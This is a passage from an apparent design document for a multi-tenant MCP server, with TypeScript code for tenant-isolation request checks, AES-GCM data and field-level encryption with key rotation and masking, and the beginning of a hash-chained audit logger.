      await this.isolation.createContext(request.tenantId, request.requestId);
    } catch (error) {
      return {
        allowed: false,
        reason: `Failed to establish tenant context: ${error}`
      };
    }
    
    // Check for suspicious patterns in request
    const suspiciousCheck = this.checkSuspiciousPatterns(request);
    if (!suspiciousCheck.safe) {
      this.logger.warn('Suspicious pattern detected in request', {
        requestId: request.requestId,
        tenantId: request.tenantId,
        patterns: suspiciousCheck.matches
      });
      
      // Don't block but sanitize
    }
    
    // Sanitize request body
    const sanitizedBody = this.sanitizeBody(request.body, request.tenantId);
    
    // Check for tenant ID in URL parameters
    if (request.query?.tenantId && request.query.tenantId !== request.tenantId) {
      return {
        allowed: false,
        reason: 'Cross-tenant access attempt detected in query parameters'
      };
    }
    
    return {
      allowed: true,
      sanitizedBody
    };
  }
  
  /**
   * Check for suspicious patterns
   */
  private checkSuspiciousPatterns(
    request: TenantRequest
  ): { safe: boolean; matches: string[] } {
    const matches: string[] = [];
    
    // Check body
    if (request.body) {
      const bodyStr = JSON.stringify(request.body);
      for (const pattern of this.suspiciousPatterns) {
        const found = bodyStr.match(pattern);
        if (found) {
          matches.push(...found);
        }
      }
    }
    
    // Check path
    for (const pattern of this.suspiciousPatterns) {
      const found = request.path.match(pattern);
      if (found) {
        matches.push(...found);
      }
    }
    
    return { safe: matches.length === 0, matches };
  }
  
  /**
   * Sanitize request body to enforce tenant isolation
   */
  private sanitizeBody(body: any, tenantId: string): any {
    if (!body) return body;
    
    if (typeof body !== 'object') return body;
    
    if (Array.isArray(body)) {
      return body.map(item => this.sanitizeBody(item, tenantId));
    }
    
    const sanitized: Record<string, any> = {};
    
    for (const [key, value] of Object.entries(body)) {
      const lowerKey = key.toLowerCase();
      
      // Force tenant ID fields to current tenant
      if (lowerKey === 'tenantid' || lowerKey === 'tenant_id' || 
          lowerKey === 'orgid' || lowerKey === 'org_id') {
        sanitized[key] = tenantId;
        continue;
      }
      
      // Remove dangerous fields
      if (lowerKey === '__proto__' || lowerKey === 'constructor' || 
          lowerKey === 'prototype') {
        continue;
      }
      
      // Recursively sanitize nested objects
      if (typeof value === 'object' && value !== null) {
        sanitized[key] = this.sanitizeBody(value, tenantId);
      } else {
        sanitized[key] = value;
      }
    }
    
    return sanitized;
  }
  
  /**
   * Validate response doesn't leak cross-tenant data
   */
  validateResponse(
    response: any,
    tenantId: string
  ): { valid: boolean; leaks: string[] } {
    const leaks: string[] = [];
    
    this.checkForLeaks(response, tenantId, '', leaks);
    
    return { valid: leaks.length === 0, leaks };
  }
  
  /**
   * Recursively check for tenant ID leaks
   */
  private checkForLeaks(
    obj: any,
    expectedTenantId: string,
    path: string,
    leaks: string[]
  ): void {
    if (!obj || typeof obj !== 'object') return;
    
    if (Array.isArray(obj)) {
      obj.forEach((item, index) => {
        this.checkForLeaks(item, expectedTenantId, `${path}[${index}]`, leaks);
      });
      return;
    }
    
    for (const [key, value] of Object.entries(obj)) {
      const currentPath = path ? `${path}.${key}` : key;
      const lowerKey = key.toLowerCase();
      
      // Check tenant ID fields
      if ((lowerKey === 'tenantid' || lowerKey === 'tenant_id') && 
          value !== expectedTenantId) {
        leaks.push(`${currentPath}: ${value}`);
      }
      
      // Recursively check nested objects
      if (typeof value === 'object' && value !== null) {
        this.checkForLeaks(value, expectedTenantId, currentPath, leaks);
      }
    }
  }
  
  /**
   * Cleanup after request
   */
  cleanup(requestId: string): void {
    this.isolation.releaseContext(requestId);
  }
}
```

### 8.5 Data Encryption

Comprehensive data encryption system protecting data at rest and in transit.

#### 8.5.1 Encryption Service

```typescript
// src/workers/L/security/encryption-service.ts
import { createCipheriv, createDecipheriv, randomBytes, scrypt } from 'crypto';
import { promisify } from 'util';
import { Redis } from 'ioredis';
import { Logger } from '../../../shared/logger';

const scryptAsync = promisify(scrypt);

/**
 * Encryption configuration
 */
interface EncryptionConfig {
  algorithm: 'aes-256-gcm' | 'aes-256-cbc' | 'chacha20-poly1305';
  keyDerivation: 'scrypt' | 'pbkdf2' | 'argon2';
  keyRotationDays: number;
  masterKeyId: string;
  saltLength: number;
  ivLength: number;
  tagLength: number;
}

/**
 * Encrypted data envelope
 */
interface EncryptedEnvelope {
  version: number;
  algorithm: string;
  keyId: string;
  iv: string; // base64
  salt: string; // base64
  tag?: string; // base64, for authenticated encryption
  ciphertext: string; // base64
  timestamp: number;
}

/**
 * Key metadata
 */
interface KeyMetadata {
  keyId: string;
  createdAt: Date;
  expiresAt: Date;
  status: 'active' | 'rotating' | 'deprecated' | 'revoked';
  algorithm: string;
  purpose: 'data' | 'session' | 'token' | 'backup';
  tenantId?: string; // For tenant-specific keys
}

/**
 * Data Encryption Service
 * Handles all encryption/decryption operations for the MCP server
 */
export class DataEncryptionService {
  private redis: Redis;
  private logger: Logger;
  private config: EncryptionConfig;
  
  private keyCache: Map<string, { key: Buffer; expiresAt: number }>;
  private currentKeyId: string | null = null;
  
  private static readonly CURRENT_VERSION = 2;
  private static readonly KEY_PREFIX = 'encryption:key:';
  private static readonly META_PREFIX = 'encryption:meta:';
  
  constructor(redis: Redis, logger: Logger, config?: Partial<EncryptionConfig>) {
    this.redis = redis;
    this.logger = logger;
    this.config = {
      algorithm: 'aes-256-gcm',
      keyDerivation: 'scrypt',
      keyRotationDays: 30,
      masterKeyId: process.env.MASTER_KEY_ID || 'master-key-default',
      saltLength: 32,
      ivLength: 12, // 12 bytes for GCM
      tagLength: 16,
      ...config
    };
    
    this.keyCache = new Map();
    
    this.initializeKeys();
  }
  
  /**
   * Encrypt data
   */
  async encrypt(
    data: string | Buffer,
    options?: {
      tenantId?: string;
      purpose?: KeyMetadata['purpose'];
      additionalData?: string;
    }
  ): Promise<string> {
    const keyInfo = await this.getCurrentKey(options?.tenantId);
    
    // Generate IV and salt
    const iv = randomBytes(this.config.ivLength);
    const salt = randomBytes(this.config.saltLength);
    
    // Derive key from master key using salt
    const derivedKey = await this.deriveKey(keyInfo.key, salt);
    
    // Create cipher
    const cipher = createCipheriv(
      this.config.algorithm, 
      derivedKey, 
      iv,
      { authTagLength: this.config.tagLength }
    );
    
    // Set additional authenticated data if provided
    if (options?.additionalData && this.config.algorithm === 'aes-256-gcm') {
      cipher.setAAD(Buffer.from(options.additionalData));
    }
    
    // Encrypt
    const dataBuffer = Buffer.isBuffer(data) ? data : Buffer.from(data, 'utf8');
    const encrypted = Buffer.concat([
      cipher.update(dataBuffer),
      cipher.final()
    ]);
    
    // Create envelope
    const envelope: EncryptedEnvelope = {
      version: DataEncryptionService.CURRENT_VERSION,
      algorithm: this.config.algorithm,
      keyId: keyInfo.keyId,
      iv: iv.toString('base64'),
      salt: salt.toString('base64'),
      ciphertext: encrypted.toString('base64'),
      timestamp: Date.now()
    };
    
    // Add auth tag for authenticated encryption
    if (this.config.algorithm === 'aes-256-gcm') {
      envelope.tag = cipher.getAuthTag().toString('base64');
    }
    
    return JSON.stringify(envelope);
  }
  
  /**
   * Decrypt data
   */
  async decrypt(
    encryptedData: string,
    options?: {
      additionalData?: string;
    }
  ): Promise<Buffer> {
    let envelope: EncryptedEnvelope;
    
    try {
      envelope = JSON.parse(encryptedData);
    } catch {
      throw new Error('Invalid encrypted data format');
    }
    
    // Validate envelope
    if (!envelope.version || !envelope.keyId || !envelope.ciphertext) {
      throw new Error('Invalid envelope structure');
    }
    
    // Get key
    const key = await this.getKey(envelope.keyId);
    if (!key) {
      throw new Error(`Key not found: ${envelope.keyId}`);
    }
    
    // Derive key using stored salt
    const salt = Buffer.from(envelope.salt, 'base64');
    const derivedKey = await this.deriveKey(key, salt);
    
    // Create decipher
    const iv = Buffer.from(envelope.iv, 'base64');
    const decipher = createDecipheriv(
      envelope.algorithm as any,
      derivedKey,
      iv,
      { authTagLength: this.config.tagLength }
    );
    
    // Set auth tag for authenticated decryption
    if (envelope.tag && envelope.algorithm === 'aes-256-gcm') {
      decipher.setAuthTag(Buffer.from(envelope.tag, 'base64'));
    }
    
    // Set additional authenticated data
    if (options?.additionalData && envelope.algorithm === 'aes-256-gcm') {
      decipher.setAAD(Buffer.from(options.additionalData));
    }
    
    // Decrypt
    const ciphertext = Buffer.from(envelope.ciphertext, 'base64');
    const decrypted = Buffer.concat([
      decipher.update(ciphertext),
      decipher.final()
    ]);
    
    return decrypted;
  }
  
  /**
   * Encrypt sensitive field
   */
  async encryptField(
    value: any,
    fieldName: string,
    tenantId?: string
  ): Promise<string> {
    const data = JSON.stringify({ 
      field: fieldName, 
      value,
      timestamp: Date.now()
    });
    
    return this.encrypt(data, { 
      tenantId,
      purpose: 'data',
      additionalData: fieldName
    });
  }
  
  /**
   * Decrypt sensitive field
   */
  async decryptField(
    encryptedValue: string,
    fieldName: string
  ): Promise<any> {
    const decrypted = await this.decrypt(encryptedValue, {
      additionalData: fieldName
    });
    
    const data = JSON.parse(decrypted.toString('utf8'));
    
    if (data.field !== fieldName) {
      throw new Error('Field name mismatch - possible tampering');
    }
    
    return data.value;
  }
  
  /**
   * Encrypt object fields selectively
   */
  async encryptObject(
    obj: Record<string, any>,
    fieldsToEncrypt: string[],
    tenantId?: string
  ): Promise<Record<string, any>> {
    const result = { ...obj };
    
    for (const field of fieldsToEncrypt) {
      if (result[field] !== undefined) {
        result[field] = await this.encryptField(result[field], field, tenantId);
      }
    }
    
    return result;
  }
  
  /**
   * Decrypt object fields selectively
   */
  async decryptObject(
    obj: Record<string, any>,
    fieldsToDecrypt: string[]
  ): Promise<Record<string, any>> {
    const result = { ...obj };
    
    for (const field of fieldsToDecrypt) {
      if (result[field] !== undefined && typeof result[field] === 'string') {
        try {
          result[field] = await this.decryptField(result[field], field);
        } catch {
          // Leave field as-is if decryption fails
          this.logger.warn(`Failed to decrypt field: ${field}`);
        }
      }
    }
    
    return result;
  }
  
  /**
   * Generate secure token
   */
  async generateSecureToken(
    length: number = 32,
    purpose: string = 'general'
  ): Promise<string> {
    const token = randomBytes(length);
    const signature = await this.signData(token, purpose);
    
    return `${token.toString('base64url')}.${signature}`;
  }
  
  /**
   * Verify secure token
   */
  async verifySecureToken(
    token: string,
    purpose: string = 'general'
  ): Promise<{ valid: boolean; data?: Buffer }> {
    const parts = token.split('.');
    if (parts.length !== 2) {
      return { valid: false };
    }
    
    const [dataBase64, signature] = parts;
    const data = Buffer.from(dataBase64, 'base64url');
    
    const expectedSignature = await this.signData(data, purpose);
    
    // Constant-time comparison
    const valid = signature.length === expectedSignature.length &&
      Buffer.compare(
        Buffer.from(signature),
        Buffer.from(expectedSignature)
      ) === 0;
    
    return { valid, data: valid ? data : undefined };
  }
  
  /**
   * Hash sensitive data (one-way)
   */
  async hashData(
    data: string,
    salt?: Buffer
  ): Promise<{ hash: string; salt: string }> {
    const useSalt = salt || randomBytes(this.config.saltLength);
    
    const derivedKey = await scryptAsync(
      data,
      useSalt,
      64
    ) as Buffer;
    
    return {
      hash: derivedKey.toString('base64'),
      salt: useSalt.toString('base64')
    };
  }
  
  /**
   * Verify hashed data
   */
  async verifyHash(
    data: string,
    hash: string,
    salt: string
  ): Promise<boolean> {
    const { hash: newHash } = await this.hashData(
      data,
      Buffer.from(salt, 'base64')
    );
    
    // Constant-time comparison
    return hash.length === newHash.length &&
      Buffer.compare(
        Buffer.from(hash),
        Buffer.from(newHash)
      ) === 0;
  }
  
  /**
   * Rotate encryption keys
   */
  async rotateKeys(): Promise<{
    newKeyId: string;
    oldKeyId: string | null;
    reencryptedCount: number;
  }> {
    const oldKeyId = this.currentKeyId;
    
    // Generate new key
    const newKey = randomBytes(32);
    const newKeyId = `key-${Date.now()}-${randomBytes(4).toString('hex')}`;
    
    // Store new key
    await this.storeKey(newKeyId, newKey, {
      status: 'active',
      purpose: 'data'
    });
    
    // Mark old key as deprecated
    if (oldKeyId) {
      await this.updateKeyStatus(oldKeyId, 'deprecated');
    }
    
    // Update current key
    this.currentKeyId = newKeyId;
    await this.redis.set('encryption:current:keyId', newKeyId);
    
    this.logger.info('Key rotation completed', { newKeyId, oldKeyId });
    
    return {
      newKeyId,
      oldKeyId,
      reencryptedCount: 0 // Re-encryption handled separately
    };
  }
  
  /**
   * Re-encrypt data with new key
   */
  async reencrypt(
    encryptedData: string,
    options?: { tenantId?: string }
  ): Promise<string> {
    const decrypted = await this.decrypt(encryptedData);
    return this.encrypt(decrypted, options);
  }
  
  // Private helper methods
  
  private async initializeKeys(): Promise<void> {
    // Try to load current key ID
    this.currentKeyId = await this.redis.get('encryption:current:keyId');
    
    if (!this.currentKeyId) {
      // Generate initial key
      const { newKeyId } = await this.rotateKeys();
      this.logger.info('Initial encryption key generated', { keyId: newKeyId });
    }
  }
  
  private async getCurrentKey(
    tenantId?: string
  ): Promise<{ key: Buffer; keyId: string }> {
    let keyId: string;
    
    if (tenantId) {
      // Check for tenant-specific key
      keyId = await this.redis.get(`encryption:tenant:${tenantId}:keyId`) || 
              this.currentKeyId!;
    } else {
      keyId = this.currentKeyId!;
    }
    
    const key = await this.getKey(keyId);
    if (!key) {
      throw new Error('Encryption key not available');
    }
    
    return { key, keyId };
  }
  
  private async getKey(keyId: string): Promise<Buffer | null> {
    // Check cache
    const cached = this.keyCache.get(keyId);
    if (cached && cached.expiresAt > Date.now()) {
      return cached.key;
    }
    
    // Load from Redis
    const keyData = await this.redis.get(
      `${DataEncryptionService.KEY_PREFIX}${keyId}`
    );
    
    if (!keyData) {
      return null;
    }
    
    const key = Buffer.from(keyData, 'base64');
    
    // Cache for 1 hour
    this.keyCache.set(keyId, {
      key,
      expiresAt: Date.now() + 60 * 60 * 1000
    });
    
    return key;
  }
  
  private async storeKey(
    keyId: string,
    key: Buffer,
    metadata: Partial<KeyMetadata>
  ): Promise<void> {
    // Store key (should use HSM in production)
    await this.redis.set(
      `${DataEncryptionService.KEY_PREFIX}${keyId}`,
      key.toString('base64')
    );
    
    // Store metadata
    const fullMetadata: KeyMetadata = {
      keyId,
      createdAt: new Date(),
      expiresAt: new Date(Date.now() + this.config.keyRotationDays * 24 * 60 * 60 * 1000),
      status: 'active',
      algorithm: this.config.algorithm,
      purpose: 'data',
      ...metadata
    };
    
    await this.redis.set(
      `${DataEncryptionService.META_PREFIX}${keyId}`,
      JSON.stringify(fullMetadata)
    );
    
    // Cache
    this.keyCache.set(keyId, {
      key,
      expiresAt: Date.now() + 60 * 60 * 1000
    });
  }
  
  private async updateKeyStatus(
    keyId: string,
    status: KeyMetadata['status']
  ): Promise<void> {
    const metaData = await this.redis.get(
      `${DataEncryptionService.META_PREFIX}${keyId}`
    );
    
    if (metaData) {
      const metadata: KeyMetadata = JSON.parse(metaData);
      metadata.status = status;
      
      await this.redis.set(
        `${DataEncryptionService.META_PREFIX}${keyId}`,
        JSON.stringify(metadata)
      );
    }
  }
  
  private async deriveKey(masterKey: Buffer, salt: Buffer): Promise<Buffer> {
    return await scryptAsync(masterKey, salt, 32) as Buffer;
  }
  
  private async signData(data: Buffer, purpose: string): Promise<string> {
    const key = await this.getKey(this.currentKeyId!);
    if (!key) {
      throw new Error('Signing key not available');
    }
    
    const { hash } = await this.hashData(
      Buffer.concat([data, Buffer.from(purpose)]).toString('base64'),
      key
    );
    
    return hash.substring(0, 43); // Truncate for reasonable length
  }
}
```

#### 8.5.2 Field-Level Encryption

```typescript
// src/workers/L/security/field-encryption.ts
import { DataEncryptionService } from './encryption-service';
import { Logger } from '../../../shared/logger';

/**
 * Field encryption policy
 */
interface FieldEncryptionPolicy {
  fieldPath: string; // Dot notation for nested fields
  encrypt: boolean;
  searchable?: boolean; // Generate searchable hash
  maskOnRead?: boolean; // Return masked value instead of decrypted
  maskPattern?: string; // e.g., "****1234" for credit cards
}

/**
 * Encryption schema for entity types
 */
interface EntityEncryptionSchema {
  entityType: string;
  fields: FieldEncryptionPolicy[];
}

/**
 * Predefined schemas for common entities
 */
const ENCRYPTION_SCHEMAS: EntityEncryptionSchema[] = [
  {
    entityType: 'customer',
    fields: [
      { fieldPath: 'email', encrypt: true, searchable: true },
      { fieldPath: 'phone', encrypt: true, searchable: true, maskOnRead: true, maskPattern: '***-***-####' },
      { fieldPath: 'address.street', encrypt: true },
      { fieldPath: 'address.city', encrypt: true },
      { fieldPath: 'bankDetails.iban', encrypt: true, maskOnRead: true, maskPattern: 'RO**-****-****-****-####' },
      { fieldPath: 'bankDetails.swift', encrypt: true },
      { fieldPath: 'cui', encrypt: false } // Not encrypted, but validated
    ]
  },
  {
    entityType: 'conversation',
    fields: [
      { fieldPath: 'messages.*.content', encrypt: true },
      { fieldPath: 'context.customerData', encrypt: true },
      { fieldPath: 'context.pricingInfo', encrypt: true }
    ]
  },
  {
    entityType: 'order',
    fields: [
      { fieldPath: 'customerEmail', encrypt: true, searchable: true },
      { fieldPath: 'customerPhone', encrypt: true },
      { fieldPath: 'shippingAddress', encrypt: true },
      { fieldPath: 'billingAddress', encrypt: true },
      { fieldPath: 'paymentDetails', encrypt: true, maskOnRead: true }
    ]
  },
  {
    entityType: 'session',
    fields: [
      { fieldPath: 'authToken', encrypt: true },
      { fieldPath: 'refreshToken', encrypt: true },
      { fieldPath: 'ipAddress', encrypt: true },
      { fieldPath: 'userAgent', encrypt: false }
    ]
  }
];

/**
 * Field-Level Encryption Manager
 * Handles selective encryption of entity fields
 */
export class FieldEncryptionManager {
  private encryption: DataEncryptionService;
  private logger: Logger;
  private schemas: Map<string, EntityEncryptionSchema>;
  private searchIndex: Map<string, Map<string, string>>; // hash -> encrypted value
  
  constructor(encryption: DataEncryptionService, logger: Logger) {
    this.encryption = encryption;
    this.logger = logger;
    this.schemas = new Map();
    this.searchIndex = new Map();
    
    // Load default schemas
    for (const schema of ENCRYPTION_SCHEMAS) {
      this.schemas.set(schema.entityType, schema);
    }
  }
  
  /**
   * Register custom encryption schema
   */
  registerSchema(schema: EntityEncryptionSchema): void {
    this.schemas.set(schema.entityType, schema);
    this.logger.info(`Registered encryption schema: ${schema.entityType}`);
  }
  
  /**
   * Encrypt entity before storage
   */
  async encryptEntity<T extends Record<string, any>>(
    entityType: string,
    entity: T,
    tenantId?: string
  ): Promise<T> {
    const schema = this.schemas.get(entityType);
    if (!schema) {
      this.logger.warn(`No encryption schema for: ${entityType}`);
      return entity;
    }
    
    const result = JSON.parse(JSON.stringify(entity)); // Deep clone
    
    for (const policy of schema.fields) {
      if (!policy.encrypt) continue;
      
      await this.encryptField(result, policy, tenantId);
    }
    
    return result;
  }
  
  /**
   * Decrypt entity after retrieval
   */
  async decryptEntity<T extends Record<string, any>>(
    entityType: string,
    entity: T,
    options?: { unmask?: boolean }
  ): Promise<T> {
    const schema = this.schemas.get(entityType);
    if (!schema) {
      return entity;
    }
    
    const result = JSON.parse(JSON.stringify(entity)); // Deep clone
    
    for (const policy of schema.fields) {
      if (!policy.encrypt) continue;
      
      await this.decryptField(result, policy, options?.unmask);
    }
    
    return result;
  }
  
  /**
   * Generate searchable hash for field
   */
  async generateSearchHash(
    entityType: string,
    fieldPath: string,
    value: string,
    tenantId?: string
  ): Promise<string | null> {
    const schema = this.schemas.get(entityType);
    const policy = schema?.fields.find(f => f.fieldPath === fieldPath);
    
    if (!policy?.searchable) {
      return null;
    }
    
    // Normalize value for searching
    const normalizedValue = value.toLowerCase().trim();
    
    // Generate deterministic hash
    const { hash } = await this.encryption.hashData(
      `${entityType}:${fieldPath}:${tenantId || 'global'}:${normalizedValue}`,
      Buffer.from(process.env.SEARCH_HASH_SALT || 'default-salt')
    );
    
    return hash;
  }
  
  /**
   * Search encrypted field by value
   */
  async searchEncryptedField(
    entityType: string,
    fieldPath: string,
    searchValue: string,
    tenantId?: string
  ): Promise<string | null> {
    const hash = await this.generateSearchHash(
      entityType, 
      fieldPath, 
      searchValue, 
      tenantId
    );
    
    return hash;
  }
  
  /**
   * Mask sensitive value
   */
  maskValue(value: string, pattern: string): string {
    if (!value || !pattern) return value;
    
    // Parse pattern: # = show character, * = mask
    let result = '';
    let valueIndex = 0;
    
    for (const patternChar of pattern) {
      if (patternChar === '#' && valueIndex < value.length) {
        result += value[valueIndex];
        valueIndex++;
      } else if (patternChar === '*') {
        result += '*';
        valueIndex++;
      } else {
        result += patternChar;
      }
    }
    
    return result;
  }
  
  // Private helper methods
  
  private async encryptField(
    obj: any,
    policy: FieldEncryptionPolicy,
    tenantId?: string
  ): Promise<void> {
    const paths = this.expandWildcardPath(obj, policy.fieldPath);
    
    for (const path of paths) {
      const value = this.getNestedValue(obj, path);
      
      if (value !== undefined && value !== null) {
        // Encrypt the value
        const encrypted = await this.encryption.encryptField(
          value,
          path,
          tenantId
        );
        
        this.setNestedValue(obj, path, encrypted);
        
        // Generate search hash if searchable
        if (policy.searchable && typeof value === 'string') {
          const hash = await this.generateSearchHash(
            '', // Will be set by caller
            path,
            value,
            tenantId
          );
          
          // Store hash in separate field
          this.setNestedValue(obj, `${path}_hash`, hash);
        }
      }
    }
  }
  
  private async decryptField(
    obj: any,
    policy: FieldEncryptionPolicy,
    unmask?: boolean
  ): Promise<void> {
    const paths = this.expandWildcardPath(obj, policy.fieldPath);
    
    for (const path of paths) {
      const encryptedValue = this.getNestedValue(obj, path);
      
      if (encryptedValue && typeof encryptedValue === 'string') {
        try {
          const decrypted = await this.encryption.decryptField(
            encryptedValue,
            path
          );
          
          // Apply masking if configured and not explicitly unmasking
          if (policy.maskOnRead && !unmask && policy.maskPattern) {
            this.setNestedValue(
              obj, 
              path, 
              this.maskValue(String(decrypted), policy.maskPattern)
            );
          } else {
            this.setNestedValue(obj, path, decrypted);
          }
        } catch (error) {
          this.logger.warn(`Failed to decrypt field: ${path}`, { error });
          // Leave as-is if decryption fails
        }
      }
    }
  }
  
  private expandWildcardPath(obj: any, path: string): string[] {
    if (!path.includes('*')) {
      return [path];
    }
    
    const paths: string[] = [];
    const parts = path.split('.');
    
    this.expandWildcardRecursive(obj, parts, 0, '', paths);
    
    return paths;
  }
  
  private expandWildcardRecursive(
    obj: any,
    parts: string[],
    index: number,
    currentPath: string,
    results: string[]
  ): void {
    if (index >= parts.length) {
      results.push(currentPath);
      return;
    }
    
    const part = parts[index];
    const prefix = currentPath ? `${currentPath}.` : '';
    
    if (part === '*') {
      const current = this.getNestedValue(obj, currentPath || undefined);
      if (Array.isArray(current)) {
        for (let i = 0; i < current.length; i++) {
          this.expandWildcardRecursive(
            obj, 
            parts, 
            index + 1, 
            `${prefix}${i}`, 
            results
          );
        }
      } else if (typeof current === 'object' && current !== null) {
        for (const key of Object.keys(current)) {
          this.expandWildcardRecursive(
            obj, 
            parts, 
            index + 1, 
            `${prefix}${key}`, 
            results
          );
        }
      }
    } else {
      this.expandWildcardRecursive(
        obj, 
        parts, 
        index + 1, 
        `${prefix}${part}`, 
        results
      );
    }
  }
  
  private getNestedValue(obj: any, path?: string): any {
    if (!path) return obj;
    
    const parts = path.split('.');
    let current = obj;
    
    for (const part of parts) {
      if (current === null || current === undefined) {
        return undefined;
      }
      current = current[part];
    }
    
    return current;
  }
  
  private setNestedValue(obj: any, path: string, value: any): void {
    const parts = path.split('.');
    let current = obj;
    
    for (let i = 0; i < parts.length - 1; i++) {
      const part = parts[i];
      if (current[part] === undefined) {
        current[part] = {};
      }
      current = current[part];
    }
    
    current[parts[parts.length - 1]] = value;
  }
}
```

### 8.6 Audit Logging

Comprehensive audit logging system for security compliance and forensic analysis.

#### 8.6.1 Audit Logger Implementation

```typescript
// src/workers/L/security/audit-logger.ts
import { Redis } from 'ioredis';
import { Logger } from '../../../shared/logger';
import { createHash } from 'crypto';
import { Queue } from 'bullmq';

/**
 * Audit event categories
 */
type AuditCategory = 
  | 'authentication'
  | 'authorization'
  | 'data_access'
  | 'data_modification'
  | 'tool_execution'
  | 'resource_access'
  | 'session'
  | 'admin'
  | 'security'
  | 'compliance';

/**
 * Audit event severity
 */
type AuditSeverity = 'info' | 'warning' | 'critical';

/**
 * Audit event structure
 */
interface AuditEvent {
  id: string;
  timestamp: Date;
  category: AuditCategory;
  action: string;
  severity: AuditSeverity;
  
  // Actor information
  actor: {
    type: 'user' | 'system' | 'api' | 'service';
    id: string;
    tenantId: string;
    sessionId?: string;
    ipAddress?: string;
    userAgent?: string;
  };
  
  // Target resource
  target?: {
    type: string;
    id: string;
    name?: string;
  };
  
  // Event details
  details: {
    method?: string;
    path?: string;
    parameters?: Record<string, any>;
    result?: 'success' | 'failure' | 'partial';
    errorCode?: string;
    errorMessage?: string;
    changes?: {
      field: string;
      oldValue?: any;
      newValue?: any;
    }[];
  };
  
  // Context
  context: {
    requestId: string;
    conversationId?: string;
    correlationId?: string;
    duration?: number;
  };
  
  // Integrity
  hash?: string;
  previousHash?: string;
}

/**
 * Audit query options
 */
interface AuditQueryOptions {
  tenantId?: string;
  actorId?: string;
  category?: AuditCategory;
  action?: string;
  severity?: AuditSeverity;
  targetType?: string;
  targetId?: string;
  startDate?: Date;
  endDate?: Date;
  result?: 'success' | 'failure';
  limit?: number;
  offset?: number;
}

/**
 * Audit log configuration
 */
interface AuditConfig {
  enabled: boolean;
  categories: AuditCategory[];
  retentionDays: number;
  hashChainEnabled: boolean;
  sensitiveFields: string[];
  asyncProcessing: boolean;
  batchSize: number;
}

/**
 * Audit Logger
 * Provides tamper-evident audit logging with hash chain
 */
export class AuditLogger {
  private redis: Redis;
  private logger: Logger;
  private config: AuditConfig;
  private auditQueue?: Queue;
  
  private lastHash: string = '';
  private eventBuffer: AuditEvent[] = [];
  private flushInterval?: NodeJS.Timeout;
  
  private static readonly EVENTS_KEY_PREFIX = 'audit:events:';
  private static readonly INDEX_KEY_PREFIX = 'audit:index:';
  private static readonly HASH_CHAIN_KEY = 'audit:hashchain';
  
  constructor(
    redis: Redis,
    logger: Logger,
    config?: Partial<AuditConfig>
  ) {
    this.redis = redis;
    this.logger = logger;
    this.config = {
      enabled: true,
      categories: ['authentication', 'authorization', 'data_access', 
                   'data_modification', 'tool_execution', 'security'],
      retentionDays: 365,
      hashChainEnabled: true,
      sensitiveFields: ['password', 'token', 'secret', 'apiKey', 
                       'creditCard', 'ssn', 'iban'],
      asyncProcessing: true,
      batchSize: 100,
      ...config
    };
    
    if (this.config.asyncProcessing) {
      this.initializeQueue();
      this.startFlushInterval();
    }
    
    this.initializeHashChain();
  }
  
  /**
   * Log audit event
   */
  async log(
    category: AuditCategory,
    action: string,
    params: {
      actor: AuditEvent['actor'];
      target?: AuditEvent['target'];
      details: AuditEvent['details'];
      context: AuditEvent['context'];
      severity?: AuditSeverity;
    }
  ): Promise<string> {
    if (!this.config.enabled || !this.config.categories.includes(category)) {
      return '';
    }
    
    // Create event
    const event: AuditEvent = {
      id: this.generateEventId(),
      timestamp: new Date(),
      category,
      action,
      severity: params.severity || this.determineSeverity(category, params.details),
      actor: this.sanitizeActor(params.actor),
      target: params.target,
      details: this.sanitizeDetails(params.details),
      context: params.context
    };
    
    // Add hash chain
    if (this.config.hashChainEnabled) {
      event.previousHash = this.lastHash;
      event.hash = this.calculateHash(event);
      this.lastHash = event.hash;
    }
    
    // Store event
    if (this.config.asyncProcessing) {
      this.eventBuffer.push(event);
      if (this.eventBuffer.length >= this.config.batchSize) {
        await this.flushBuffer();
      }
    } else {
      await this.storeEvent(event);
    }
    
    // Log critical events immediately
    if (event.severity === 'critical') {
      this.logger.warn('Critical audit event', {
        category,
        action,
        actor: event.actor,
        target: event.target
      });
    }
    
    return event.id;
  }
  
  /**
   * Log authentication event
   */
  async logAuthentication(
    action: 'login' | 'logout' | 'token_refresh' | 'password_change' | 
           'mfa_verify' | 'login_failed' | 'account_locked',
    params: {
      userId: string;
      tenantId: string;
      sessionId?: string;
      ipAddress?: string;
      userAgent?: string;
      result: 'success' | 'failure';
      errorMessage?: string;
      requestId: string;
    }
  ): Promise<string> {
    return this.log('authentication', action, {
      actor: {
        type: 'user',
        id: params.userId,
        tenantId: params.tenantId,
        sessionId: params.sessionId,
        ipAddress: params.ipAddress,
        userAgent: params.userAgent
      },
      details: {
        result: params.result,
        errorMessage: params.errorMessage
      },
      context: {
        requestId: params.requestId
      },
      severity: params.result === 'failure' ? 'warning' : 'info'
    });
  }
  
  /**
   * Log authorization event
   */
  async logAuthorization(
    action: 'access_granted' | 'access_denied' | 'permission_check' | 
           'role_assigned' | 'role_removed',
    params: {
      userId: string;
      tenantId: string;
      resource: string;
      resourceId?: string;
      permission: string;
      granted: boolean;
      requestId: string;
    }
  ): Promise<string> {
    return this.log('authorization', action, {
      actor: {
        type: 'user',
        id: params.userId,
        tenantId: params.tenantId
      },
      target: {
        type: params.resource,
        id: params.resourceId || 'N/A'
      },
      details: {
        parameters: { permission: params.permission },
        result: params.granted ? 'success' : 'failure'
      },
      context: {
        requestId: params.requestId
      },
      severity: params.granted ? 'info' : 'warning'
    });
  }
  
  /**
   * Log data modification event
   */
  async logDataModification(
    action: 'create' | 'update' | 'delete' | 'bulk_update' | 'bulk_delete',
    params: {
      actor: AuditEvent['actor'];
      entityType: string;
      entityId: string;
      changes?: AuditEvent['details']['changes'];
      requestId: string;
    }
  ): Promise<string> {
    return this.log('data_modification', action, {
      actor: params.actor,
      target: {
        type: params.entityType,
        id: params.entityId
      },
      details: {
        changes: params.changes,
        result: 'success'
      },
      context: {
        requestId: params.requestId
      }
    });
  }
  
  /**
   * Log tool execution event
   */
  async logToolExecution(
    toolName: string,
    params: {
      actor: AuditEvent['actor'];
      parameters: Record<string, any>;
      result: 'success' | 'failure';
      duration: number;
      errorMessage?: string;
      requestId: string;
    }
  ): Promise<string> {
    return this.log('tool_execution', `execute_${toolName}`, {
      actor: params.actor,
      target: {
        type: 'tool',
        id: toolName,
        name: toolName
      },
      details: {
        parameters: params.parameters,
        result: params.result,
        errorMessage: params.errorMessage
      },
      context: {
        requestId: params.requestId,
        duration: params.duration
      }
    });
  }
  
  /**
   * Log security event
   */
  async logSecurityEvent(
